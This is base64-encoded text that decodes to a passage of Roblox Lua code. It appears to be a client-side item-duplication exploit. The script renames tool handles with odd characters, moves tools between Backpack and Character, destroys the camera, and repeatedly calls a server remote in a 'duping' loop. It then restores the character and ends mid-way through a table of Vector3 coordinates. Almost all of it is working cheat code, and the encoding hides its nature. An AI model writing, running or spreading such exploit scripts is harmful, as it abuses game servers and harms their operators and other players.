CAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIGRkdmR2ZHN2ZGZicm55dHl0bXZkdi5uYW1lID09IHRvb2xzZWxjdGVkID09IGZhbHNlIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkZHZkdmRzdmRmYnJueXR5dG12ZHY6RGVzdHJveSgpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZm9yIGZpbmRpbix0b29sbGVsIGluIHBhaXJzKGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyLkNoYXJhY3RlcjpHZXRDaGlsZHJlbigpKSBkbwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgdG9vbGxlbDpJc0EoIlRvb2wiKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIHRvb2xsZWwuTmFtZSA9PSB0b29sc2VsY3RlZCB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdG9vbGxsbGZvdW4yID0gdHJ1ZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZvciBiYXNjLGFpamZ3IGluIHBhaXJzKHRvb2xsZWw6R2V0RGVzY2VuZGFudHMoKSkgZG8KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIGFpamZ3Lk5hbWUgPT0gIkhhbmRsZSIgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBhaWpmdy5OYW1lID0gIkjiIKVh4iClbuIgpWTiIKVs4iClZSIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdG9vbGxlbC5QYXJlbnQgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2sKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRvb2xsZWwuUGFyZW50ID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlcgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdG9sbGxsYWhoaGggPSB0b29sbGVsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UgdG9vbGxsbGZvdW4yID0gZmFsc2UKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmb3IgZmlpZmksdG9vbGxsbCBpbiBwYWlycyhnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllci5CYWNrcGFjazpHZXRDaGlsZHJlbigpKSBkbwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgdG9vbGxsbDpJc0EoIlRvb2wiKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIHRvb2xsbGwuTmFtZSA9PSB0b29sc2VsY3RlZCB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdG9vbGxsbGZvdW4gPSB0cnVlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZm9yIG5hbmEsampzanNqIGluIHBhaXJzKHRvb2xsbGw6R2V0RGVzY2VuZGFudHMoKSkgZG8KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIGpqc2pzai5OYW1lID09ICJIYW5kbGUiIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdG9vbGxsbC5QYXJlbnQgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHdhaXQoKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBqanNqc2ouTmFtZSA9ICJI4iClYeIgpW7iIKVk4iClbOIgpWUiCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRvb2xsbGwuUGFyZW50ID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRvb2xsbGwuUGFyZW50ID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlcgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0b29sbGxmZmVsID0gdG9vbGxsbAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UgdG9vbGxsbGZvdW4gPSBmYWxzZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgdG9vbGxsbGZvdW4gPT0gdHJ1ZSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQodG9vbGxsZmZlbCkgPT0gbmlsIHRoZW4gIHRvb2xsbGxmb3VuID0gZmFsc2UgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcmVwZWF0IHdhaXQoKSB1bnRpbCBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKHRvb2xsbGZmZWwpID09IG5pbAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRvb2xsbGxmb3VuID0gZmFsc2UKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiB0b29sbGxsZm91bjIgPT0gdHJ1ZSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKHRvbGxsbGFoaGhoKSA9PSBuaWwgdGhlbiB0b29sbGxsZm91bjIgPSBmYWxzZSBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJlcGVhdCB3YWl0KCkgdW50aWwgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCh0b2xsbGxhaGhoaCkgPT0gbmlsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0b29sbGxsZm91bjIgPSBmYWxzZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHdhaXQoMSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmb3IgbT0xLCBkdXBlYW1vdCBkbwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgZHVwaW5nID09IGZhbHNlIHRoZW4gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LkFuY2hvcmVkID0gZmFsc2UgcmV0dXJuIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgZ2FtZTpHZXRTZXJ2aWNlKCJXb3Jrc3BhY2UiKTpGaW5kRmlyc3RDaGlsZCgiQ2FtZXJhIikgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBnYW1lOkdldFNlcnZpY2UoIldvcmtzcGFjZSIpOkZpbmRGaXJzdENoaWxkKCJDYW1lcmEiKTpEZXN0cm95KCkgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIG0gPD0gZHVwZWFtb3QgdGhlbgogICAgICAgICAgICAgICAgZWxzZWlmIG0gPT0gZHVwZWFtb3Qgb3IgbSA+PSBkdXBlYW1vdCAtIDEgdGhlbgogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCB2YXJfb3FsZnF4ID0gewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBbMV0gPSAiUGlja2luZ1Rvb2xzIiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgWzJdID0gdG9vbHNlbGN0ZWQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcGlja3Rvb2xyZW1vdGU6SW52b2tlU2VydmVyKHVucGFjayhhcmdzKSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyLkJhY2twYWNrOldhaXRGb3JDaGlsZCh0b29sc2VsY3RlZCkuUGFyZW50ID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlcgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgZHVwaW5nID09IGZhbHNlIHRoZW4gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LkFuY2hvcmVkID0gZmFsc2UgcmV0dXJuIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgd2FpdCgpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllci5DaGFyYWN0ZXJbdG9vbHNlbGN0ZWRdOkZpbmRGaXJzdENoaWxkKCJIYW5kbGUiKS5OYW1lID0gIkjiIKVh4iClbuIgpWTiIKVs4iClZSIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCh0b29sc2VsY3RlZCkuUGFyZW50ID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllci5CYWNrcGFjazpGaW5kRmlyc3RDaGlsZCh0b29sc2VsY3RlZCkuUGFyZW50ID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlcgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcmVwZWF0ICAgICAgICAgaWYgZ2FtZTpHZXRTZXJ2aWNlKCJXb3Jrc3BhY2UiKTpGaW5kRmlyc3RDaGlsZCgiQ2FtZXJhIikgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBnYW1lOkdldFNlcnZpY2UoIldvcmtzcGFjZSIpOkZpbmRGaXJzdENoaWxkKCJDYW1lcmEiKTpEZXN0cm95KCkgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoKSB1bnRpbAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKHRvb2xzZWxjdGVkKSA9PSBuaWwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuQW5jaG9yZWQgPSBmYWxzZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJlcGVhdCB3YWl0KCkgdW50aWwgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpID09IG5pbAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJlcGVhdCB3YWl0KCkgdW50aWwgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LkNGcmFtZSA9IG9sZGNmCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZm9yIHoseCBpbiBwYWlycyhnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2s6R2V0Q2hpbGRyZW4oKSkgZG8KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIHguTmFtZSA9PSB0b29sc2VsY3RlZCB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRvb2xhbW91dGggPSB6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB3YWl0KCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkdXBpbmcgPSBmYWxzZQogICB3YWl0KDEpCgoKbG9jYWwgdmFyX2prZmxxbCA9IHsKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDAsIDMsIDYpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoMSwgMywgNiksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygyLCAzLCA2KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDMsIDMsIDYpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoNCwgMywgNiksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldyg1LCAzLCA2KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDYsIDMsIDYpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoMCwgMywgMTcpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoMSwgMywgMTcpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoMiwgMywgMTcpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoMywgMywgMTcpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoNCwgMywgMTcpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoNSwgMywgMTcpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoNiwgMywgMTcpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoMCwgMywgMzApLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoMSwgMywgMzApLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoMiwgMywgMzApLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoMywgMywgMzApLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoNCwgMywgMzApLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoNSwgMywgMzApLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoNiwgMywgMzApLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoMCwgMywgNDMpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoMSwgMywgNDMpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoMiwgMywgNDMpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoMywgMywgNDMpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoNCwgMywgNDMpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoNSwgMywgNDMpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoNiwgMywgNDMpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoMCwgMywgNTUpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoMSwgMywgNTUpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoMiwgMywgNTUpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoMywgMywgNTUpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoNCwgMywgNTUpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoNSwgMywgNTUpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoNiwgMywgNTUpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoLTEgLCAzLCA2KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KC0yICwgMywgNiksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygtMyAsIDMsIDYpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoLTQgLCAzLCA2KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KC01ICwgMywgNiksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygtNiAsIDMsIDYpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoLTcgLCAzLCA2KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KC04ICwgMywgNiksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygtOSAsIDMsIDYpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoLTEwICwgMywgNiksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygtMTEgLCAzLCA2KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KC0xMiAsIDMsIDYpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoLTEzICwgMywgNiksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygtMTQgLCAzLCA2KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KC0xNSAsIDMsIDYpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoLTE2ICwgMywgNiksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygtMTcgLCAzLCA2KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KC0xOCAsIDMsIDYpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoLTE5ICwgMywgNiksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygtMjAgLCAzLCA2KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KC0yMSAsIDMsIDYpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoMSAsIDMsIDU1KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDIgLCAzLCA1NSksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygzICwgMywgNTUpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoNCAsIDMsIDU1KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDUgLCAzLCA1NSksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldyg2ICwgMywgNTUpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoNyAsIDMsIDU1KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDggLCAzLCA1NSksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldyg5ICwgMywgNTUpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoMTAgLCAzLCA1NSksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygxMSAsIDMsIDU1KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDEyICwgMywgNTUpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoMTMgLCAzLCA1NSksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygxNCAsIDMsIDU1KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDE1ICwgMywgNTUpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoMTYgLCAzLCA1NSksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygxNyAsIDMsIDU1KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDE4ICwgMywgNTUpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoMTkgLCAzLCA1NSksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygyMCAsIDMsIDU1KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDIxICwgMywgNTUpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoMjIgLCAzLCA1NSksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygtMTYsIDMsIDQzKSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygtMTcsIDMsIDQzKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KC0xOCwgMywgNDMpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoLTE5LCAzLCA0MyksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygtMjAsIDMsIDQzKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KC0yMSwgMywgNDMpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoLTE2LCAzLCA0MyksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygtMTUsIDMsIDQzKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KC0xNiwgMywgNDMpLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygtMTcsIDMsIDU1KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KC0xOCwgMywgNTUpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoLTE5LCAzLCA1NSksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygtMjAsIDMsIDU1KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KC0yMSwgMywgNTUpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoLTE2LCAzLCA1NSksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygtMTUsIDMsIDU1KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDAsIDMsIDU1KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDEsIDMsIDU1KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDIsIDMsIDU1KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDMsIDMsIDU1KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDQsIDMsIDU1KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDUsIDMsIDU1KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDYsIDMsIDU1KSwKICAgICAgICAgVmVjdG9yMy5uZXcoMjMgLCAzLCA1NSksCiAgICAgICAgIFZlY3RvcjMubmV3KDI0ICwgMywgNTUpLAogICAgICAgICAgVmVjdG9yMy5uZXcoMjUgLCAzLCA1NSksCiAgICAgICAgICAgVmVjdG9yMy5uZXcoMjYgLCAzLCA1NSksCiAgICAgICAgICAgIFZlY3RvcjMubmV3KDI3ICwgMywgNTUpLAogICAgICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoLTEgLCAzLCAzMCksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygtMiAsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KC0zICwgMywgMzApLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoLTQgLCAzLCAzMCksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygtNSAsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KC02ICwgMywgMzApLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoLTcgLCAzLCAzMCksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygtOCAsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KC05ICwgMywgMzApLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoLTEwICwgMywgMzApLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoLTExICwgMywgMzApLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoLTEyICwgMywgMzApLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoLTEzICwgMywgMzApLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoLTE0ICwgMywgMzApLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoLTE1ICwgMywgMzApLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoLTE2ICwgMywgMzApLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoLTE3ICwgMywgMzApLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoLTE4ICwgMywgMzApLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoLTE5ICwgMywgMzApLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoLTIwICwgMywgMzApLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoLTIxICwgMywgMzApLAogICAgICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDEgLCAzLCAzMCksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygyICwgMywgMzApLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoMyAsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDQgLCAzLCAzMCks